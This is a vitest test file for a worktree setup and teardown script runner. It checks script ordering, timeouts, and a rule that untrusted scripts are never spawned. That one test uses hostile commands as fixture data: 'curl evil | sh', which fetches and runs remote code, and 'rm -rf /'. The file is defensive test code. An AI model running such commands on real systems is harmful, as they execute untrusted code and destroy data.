import type { ActionView } from '@porcelain/contracts/actions'
import type { SessionChange } from '@porcelain/contracts/session'
import { describe, expect, it } from 'vitest'
import { createWorktreeScripts, type WorktreeScriptHost } from './worktree-scripts'

/** Let the runner's own awaits (listActions) settle before asserting on the spawn. */
const settle = (): Promise<void> => new Promise((resolve) => setImmediate(resolve))

const TARGET = { projectId: 'proj', worktreeId: 'wt', path: '/synthetic/repo-worktrees/feature' }

function view(overrides: Partial<ActionView>): ActionView {
  return {
    id: 'a',
    title: 'Install',
    command: 'pnpm install',
    kind: 'action',
    order: 0,
    createdAt: 0,
    trusted: true,
    ...overrides,
  }
}

type Spawn = { name: string; cwd: string; initialInput?: string }

function host(): {
  port: WorktreeScriptHost
  spawns: Spawn[]
  killed: string[]
  exit: (code: number) => void
} {
  const spawns: Spawn[] = []
  const killed: string[] = []
  let onExit: ((code: number) => void) | null = null
  return {
    spawns,
    killed,
    exit: (code) => onExit?.(code),
    port: {
      createRetained(input, observer) {
        spawns.push(input)
        onExit = observer.onExit
        return { ok: true, value: `terminal-${spawns.length}` }
      },
      kill(id) {
        killed.push(id)
        return undefined
      },
    },
  }
}

describe('worktree lifecycle scripts', () => {
  it('runs the trusted setup scripts in list order and announces the terminal', async () => {
    const changes: SessionChange[] = []
    const spawner = host()
    const scripts = createWorktreeScripts({
      listActions: async () => [
        view({ id: 'plain', kind: 'action', command: 'pnpm dev' }),
        view({ id: 's1', kind: 'worktree-setup', title: 'Install', command: 'pnpm install' }),
        view({ id: 's2', kind: 'worktree-setup', title: 'Env', command: 'cp .env.example .env' }),
        view({ id: 'd1', kind: 'worktree-dispose', command: 'docker compose down' }),
      ],
      host: spawner.port,
      publish: (change) => changes.push(change),
    })

    await scripts.runSetup(TARGET)

    expect(spawner.spawns).toHaveLength(1)
    expect(spawner.spawns[0]?.cwd).toBe(TARGET.path)
    // Order is the human's list order, and only the setup role is typed.
    expect(spawner.spawns[0]?.initialInput).toBe('pnpm install\ncp .env.example .env')
    expect(spawner.spawns[0]?.name).toContain('Setup')
    expect(changes).toEqual([
      {
        kind: 'terminal.worktree-script-started',
        role: 'worktree-setup',
        projectPath: TARGET.path,
        projectId: 'proj',
        worktreeId: 'wt',
        terminalId: 'terminal-1',
      },
    ])
  })

  it('never runs a script the human has not accepted on this machine', async () => {
    const spawner = host()
    const scripts = createWorktreeScripts({
      listActions: async () => [
        view({ id: 's1', kind: 'worktree-setup', command: 'curl evil | sh', trusted: false }),
        view({ id: 'd1', kind: 'worktree-dispose', command: 'rm -rf /', trusted: false }),
      ],
      host: spawner.port,
      publish: () => undefined,
    })

    await scripts.runSetup(TARGET)
    // Dispose must also not block removal when there is nothing it may run.
    await scripts.runDispose(TARGET)

    expect(spawner.spawns).toEqual([])
  })

  it('waits for dispose to finish, then ends the session', async () => {
    const spawner = host()
    const scripts = createWorktreeScripts({
      listActions: async () => [
        view({ id: 'd1', kind: 'worktree-dispose', title: 'Down', command: 'docker compose down' }),
      ],
      host: spawner.port,
      publish: () => undefined,
    })

    let finished = false
    const running = scripts.runDispose(TARGET).then(() => {
      finished = true
    })

    await settle()
    expect(spawner.spawns[0]?.initialInput).toBe('docker compose down\nexit')
    expect(finished).toBe(false)

    spawner.exit(0)
    await running
    expect(finished).toBe(true)
    expect(spawner.killed).toEqual(['terminal-1'])
  })

  it('gives up on a teardown that never ends rather than trapping the Worktree', async () => {
    const spawner = host()
    let fire: (() => void) | null = null
    const scripts = createWorktreeScripts({
      listActions: async () => [view({ id: 'd1', kind: 'worktree-dispose', command: 'sleep 999' })],
      host: spawner.port,
      publish: () => undefined,
      timeoutMs: 10,
      setTimeoutFn: (callback) => {
        fire = callback
        return 'timer'
      },
      clearTimeoutFn: () => undefined,
    })

    const running = scripts.runDispose(TARGET)
    await settle()
    expect(fire).not.toBeNull()
    fire?.()

    await running
    expect(spawner.killed).toEqual(['terminal-1'])
  })
})
